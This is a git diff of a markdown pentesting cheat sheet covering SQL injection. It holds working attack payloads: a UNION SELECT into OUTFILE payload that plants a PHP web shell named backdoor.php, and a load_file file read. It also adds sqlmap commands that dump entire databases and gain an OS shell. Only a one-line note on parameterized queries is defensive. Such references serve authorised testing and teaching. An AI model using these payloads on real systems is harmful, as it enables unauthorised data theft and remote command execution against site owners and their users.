@@ -1705,16 +1705,18 @@ Using the `load_file` function: `?id=1 union all select 1, 2, load_file('C:/Wind
 - Write a PHP shell using the `OUTFILE` function: `?id=1 union all select 1, 2, "<?php echo shell_exec($_GET['cmd']);?>" into OUTFILE 'c:/xampp/htdocs/backdoor.php'`. Then access `backdoor.php&cmd=ipconfig`.
 
 **sqlmap**
-```
- > SQLMap: sqlmap -u https://vulnerable/index.php?id=1
-                  --tables (to see db)
-                  -D DATABASE_NAME -T TABLE_NAME --dump (to see data)
-                  --forms --batch --crawl=10 --random-agent --level=5 --risk=3 (to crawl)
-		  -l (to parse a Burp log file)
-		  --parse-errors --current-db --invalid-logical --invalid-bignum --invalid-string --risk 3		  
-		  --force-ssl --threads 5 --level 1 --risk 1 --tamper=space2comment
-```
-- 
+- ```
+   > SQLMap: sqlmap -u https://vulnerable/index.php?id=1
+                    --tables (to see db)
+                    -D DATABASE_NAME -T TABLE_NAME --dump (to see data)
+                    --forms --batch --crawl=10 --random-agent --level=5 --risk=3 (to crawl)
+  		    -l (to parse a Burp log file)
+  		    --parse-errors --current-db --invalid-logical --invalid-bignum --invalid-string --risk 3		  
+  		    --force-ssl --threads 5 --level 1 --risk 1 --tamper=space2comment
+  ```
+- `sqlmap -u http://victim/page.php?param=1 -p param` test the parameter `param`
+  - `sqlmap -u http://victim/page.php?param=1 -p param --dump` dump the entire database
+- `sqlmap -r request.txt -p param  --os-shell  --web-root "/var/www/html/tmp"` gain shell
 
 **How to fix SQL injections**: Use parameterized queries/prepared statements to protect against SQL injections by isolating user input from SQL code. They add placeholders for user input in SQL statements, creating a layer of isolation and preventing user input from affecting SQL code.
 
